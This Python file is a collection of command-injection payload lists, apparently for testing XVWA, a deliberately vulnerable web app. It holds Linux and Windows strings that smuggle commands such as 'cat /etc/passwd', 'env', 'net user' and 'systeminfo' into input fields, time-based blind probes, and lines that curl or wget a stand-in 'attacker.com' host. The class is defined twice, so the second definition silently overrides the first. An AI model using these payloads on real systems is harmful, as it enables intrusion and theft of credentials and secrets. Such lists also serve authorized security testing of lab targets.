"""
Command Injection payload collection
"""

from typing import List

class CommandInjectionPayloads:
    """Command Injection payload collection"""
    
    @staticmethod
    def get_linux_payloads() -> List[str]:
        """Get Linux command injection payloads"""
        return [
            '; id',
            '| id',
            '&& id',
            '|| id',
            '`id`',
            '$(id)',
            '; whoami',
            '| whoami',
            '&& whoami',
            '; ls -la',
            '| ls -la',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; uname -a',
            '| uname -a',
            '; ps aux',
            '| ps aux'
        ]
    
    @staticmethod
    def get_windows_payloads() -> List[str]:
        """Get Windows command injection payloads"""
        return [
            '& dir',
            '| dir',
            '&& dir',
            '|| dir',
            '& whoami',
            '| whoami',
            '&& whoami',
            '& ver',
            '| ver',
            '& type c:\\windows\\win.ini',
            '| type c:\\windows\\win.ini',
            '& net user',
            '| net user',
            '& ipconfig',
            '| ipconfig'
        ]
    
    @staticmethod
    def get_blind_payloads() -> List[str]:
        """Get blind command injection payloads"""
        return [
            '; sleep 5',
            '| sleep 5',
            '&& sleep 5',
            '; ping -c 4 127.0.0.1',
            '| ping -c 4 127.0.0.1',
            '& ping -n 4 127.0.0.1',
            '| ping -n 4 127.0.0.1',
            '; curl http://attacker.com',
            '| curl http://attacker.com',
            '; wget http://attacker.com',
            '| wget http://attacker.com'
        ]
    
    @staticmethod
    def get_all_payloads() -> List[str]:
        """Get all command injection payloads"""
        payloads = []
        payloads.extend(CommandInjectionPayloads.get_linux_payloads())
        payloads.extend(CommandInjectionPayloads.get_windows_payloads())
        payloads.extend(CommandInjectionPayloads.get_blind_payloads())
        return payloads
class CommandInjectionPayloads:
    """Command Injection payload collection optimized for XVWA"""
    
    @staticmethod
    def get_linux_payloads() -> List[str]:
        """Linux command injection payloads that work on XVWA"""
        return [
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; uname -a",
            "| uname -a",
            "& uname -a",
            "&& uname -a",
            "|| uname -a",
            "`uname -a`",
            "$(uname -a)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "&& ls -la",
            "|| ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; ps aux",
            "| ps aux",
            "& ps aux",
            "&& ps aux",
            "|| ps aux",
            "`ps aux`",
            "$(ps aux)",
            "; pwd",
            "| pwd",
            "& pwd",
            "&& pwd",
            "|| pwd",
            "`pwd`",
            "$(pwd)",
            "; env",
            "| env",
            "& env",
            "&& env",
            "|| env",
            "`env`",
            "$(env)"
        ]

    @staticmethod
    def get_windows_payloads() -> List[str]:
        """Windows command injection payloads that work on XVWA"""
        return [
            "& whoami",
            "&& whoami",
            "| whoami",
            "|| whoami",
            "; whoami",
            "& ver",
            "&& ver",
            "| ver",
            "|| ver",
            "; ver",
            "& dir",
            "&& dir",
            "| dir",
            "|| dir",
            "; dir",
            "& ipconfig",
            "&& ipconfig",
            "| ipconfig",
            "|| ipconfig",
            "; ipconfig",
            "& netstat -an",
            "&& netstat -an",
            "| netstat -an",
            "|| netstat -an",
            "; netstat -an",
            "& tasklist",
            "&& tasklist",
            "| tasklist",
            "|| tasklist",
            "; tasklist",
            "& systeminfo",
            "&& systeminfo",
            "| systeminfo",
            "|| systeminfo",
            "; systeminfo"
        ]

    @staticmethod
    def get_blind_payloads() -> List[str]:
        """Blind command injection payloads for XVWA"""
        return [
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            "& ping -c 5 127.0.0.1",
            "&& ping -c 5 127.0.0.1",
            "|| ping -c 5 127.0.0.1",
            "`ping -c 5 127.0.0.1`",
            "$(ping -c 5 127.0.0.1)",
            "; ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "& ping -n 5 127.0.0.1",
            "&& ping -n 5 127.0.0.1",
            "|| ping -n 5 127.0.0.1"
        ]
